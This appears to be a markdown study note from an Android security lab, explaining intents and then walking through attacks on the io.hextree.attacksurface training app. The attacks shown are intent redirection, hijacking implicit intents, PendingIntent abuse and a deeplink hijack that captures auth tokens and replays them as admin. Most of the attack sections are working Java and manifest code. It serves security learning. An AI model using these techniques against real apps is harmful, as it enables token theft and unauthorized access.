# Intents

- [Interaction with Intents](#interaction-with-intents)
- [Activity Life Cycle](#activity-life-cycle)
- [Returning Activity Results](#returning-activity-results)
- [Attacks](#attacks)
    - [Intent Redirection](#intent-redirection)
    - [Implicit Intents](#implicit-intents)
    - [Delegation via Pending Intents](#delegation-via-pending-intents)
- [DeepLinks](#deeplinks)


## Interaction with Intents
- **Commands to interact with intents**
    - `intent.setClassName(<Package_Name>,<Class_Name>);`
    - `<Intent_Name>.setAction(<Action_Name>)`
    - `startActivity(<Intent_Name>)`
    - `intent.setData(Uri.parse("https://google.com"));`
    


- **Nested Intents**
```java
Intent intent3 = new Intent();
intent3.putExtra("reason","back");

Intent intent2 = new Intent();
intent2.putExtra("return",42);
intent2.putExtra("nextIntent",intent3);

Intent intent1 = new Intent();
intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
intent1.putExtra("android.intent.extra.INTENT",intent2);
startActivity(intent1);
```

## Activity Life Cycle

- Scenarios When `onNewIntent()` Is Triggered
    1. Activity Launched with `FLAG_ACTIVITY_SINGLE_TOP`:
        - If the activity is already running at the top of the back stack, and a new intent is sent to it with the `Intent.FLAG_ACTIVITY_SINGLE_TOP` flag, the system calls `onNewIntent()` instead of creating a new instance of the activity.
    2. Activity Configured with `launchMode="singleTop"`:

        - If the activity is declared in the `AndroidManifest.xml` file with the launchMode attribute set to `singleTop`, the system calls `onNewIntent()` when the activity is already at the top of the stack and receives a new intent.
        ```xml
        <activity
            android:name=".YourActivity"
            android:launchMode="singleTop" />
        ```

    3. Activity Declared as `singleTask` or `singleInstance`:

        - For activities declared with `launchMode="singleTask"` or `launchMode="singleInstance"`, `onNewIntent()` is called when the activity is already running in a task and a new intent is directed to it.
    4. Task Reuse (`Intent.FLAG_ACTIVITY_REORDER_TO_FRONT`):

        - If you launch an activity that is already in the back stack of the current task using the `FLAG_ACTIVITY_REORDER_TO_FRONT` flag, the system brings it to the front and calls `onNewIntent()`.


## Returning Activity Results
1. `getCallingActivity()`
    - `getCallingActivity()` is used to retrieve the component name of the activity that started the current activity using `startActivityForResult()`.
    ```java
        ComponentName callingActivity = getCallingActivity();
        if (callingActivity != null) {
            Log.d("Caller", "Calling activity: " + callingActivity.getClassName());
        }
    ```

2. `startActivityForResult()`

    - `startActivityForResult()` is used to start another activity with the expectation of getting a result back. The result is received in the `onActivityResult()` method.
    ```java
    Intent intent = new Intent(this, SecondActivity.class);
    startActivityForResult(intent, 1); // 1 is the requestCode

    ```

3. `onActivityResult()`
    - `onActivityResult()` is a callback method in the originating activity that receives the result sent back by the target activity.
    ```java
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 1) { // Matching the requestCode
            if (resultCode == RESULT_OK) {
                String result = data.getStringExtra("resultKey");
                Log.d("Result", "Result from SecondActivity: " + result);
            }
        }
    }
    ```
    - Results are returned using `setResult()` in the target activity.


## Attacks
### Intent Redirection
- If we can control the intent input of the startActivity() function, it may lead to an intent redirection vulnerability.
```java
// Redirect to flag6 Activity
Intent intent3 = new Intent();
intent3.putExtra("reason","next");
intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");

Intent intent2 = new Intent();
intent2.putExtra("return",42);
intent2.putExtra("nextIntent",intent3);

Intent intent1 = new Intent();
intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
intent1.putExtra("android.intent.extra.INTENT",intent2);
startActivity(intent1);
```

> [!NOTE]
> `FLAG_GRANT_READ_URI_PERMISSION`: If set, the recipient of this Intent will be granted permission to perform read operations on the URI in the Intent's data and any URIs specified in its ClipData.

### Implicit Intents

- As an attacker we rarely send implicit intents, because usually we want to explicitly target a specific vulnerable app.

- But receiving implicit intents could result in typical issues. If an app uses implicit intents insecurely, for example when it transmits sensitive data, then registering a handler for this intent could exploit this.

- Example:
```java
Intent intent = getIntent();
Utils.showDialog(this,intent);
if("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())){
    String flag = intent.getStringExtra("flag");
    Toast.makeText(this,flag,Toast.LENGTH_LONG).show();
}else{
    Log.d("Flag10", "Not Received");
}
```
```xml
<activity
    android:name=".Second_Activity"
    android:exported="true">
<intent-filter>
    <action android:name="io.hextree.attacksurface.ATTACK_ME"/>
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>

</activity>
```


### Delegation via Pending Intents

- A PendingIntent is like a pre-written request that your app gives to Android or another app.

- It says: "Later, do this action in my app."

- Used when you want something to happen in the future, even if your app is closed.

- Create a PendingIntent that will open Second_Activity:
```java

    Intent catcherIntent = new Intent(this,Second_Activity.class);
    // Must be mutable to allow Flag22Activity to add extras like the flag
    PendingIntent pendingIntent = PendingIntent.getActivity(
            this,
            0,
            catcherIntent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE
    );

    Intent exploitIntent = new Intent();
    exploitIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity");
    exploitIntent.putExtra("PENDING", pendingIntent);

    startActivity(exploitIntent);

```
> [!NOTE]
> `FLAG_MUTABLE` is important on Android 12+ to let another app (like Flag22Activity) modify the Intent and add the flag.

- This is Second_Activity that catch the result:
```java
      String flag = getIntent().getStringExtra("flag");
        if (flag != null) {
            Log.d("FLAG22", "Flag received: " + flag);
        }
        // Optional: finish after showing flag
        finish();
```


- Another example How can we recieve an PendingIntent:
```java
        PendingIntent pendingIntent = (PendingIntent) getIntent().getParcelableExtra("pending_intent");
        if (pendingIntent != null) {
            try {
                Intent intent = new Intent();
                intent.setAction("io.hextree.attacksurface.GIVE_FLAG");
                intent.putExtra("code", 42);
                pendingIntent.send(this, 0, intent);
            } catch (RuntimeException | PendingIntent.CanceledException e) {
                throw new RuntimeException(e);
            }

        }
```

## DeepLinks
- Some activities can also be reached by a website in the browser. 
- This is of course a much more interesting attack model, as it doesn't require a victim to install a malicious app. These web links that result into opening an app are so called deep links.

- Hijacking deeplink Example:
```xml
  <activity
            android:name=".Hextree"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data
                    android:scheme="hex"
                    android:host="token"/>
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
```
```java
Intent receivedIntent = getIntent();
if(receivedIntent.getAction() == "android.intent.action.VIEW"){
    Uri data = receivedIntent.getData();
    Log.d("queryParameters", String.valueOf(data));
    String authToken = data.getQueryParameter("authToken");
    String authChallenge = data.getQueryParameter("authChallenge");

    Intent sendIntent = new Intent();
    sendIntent.setAction("android.intent.action.VIEW");
    sendIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag14Activity");
    sendIntent.setData(Uri.parse("hex://token?authToken="+authToken+"&type=admin&authChallenge="+authChallenge));
    startActivity(sendIntent);
}
```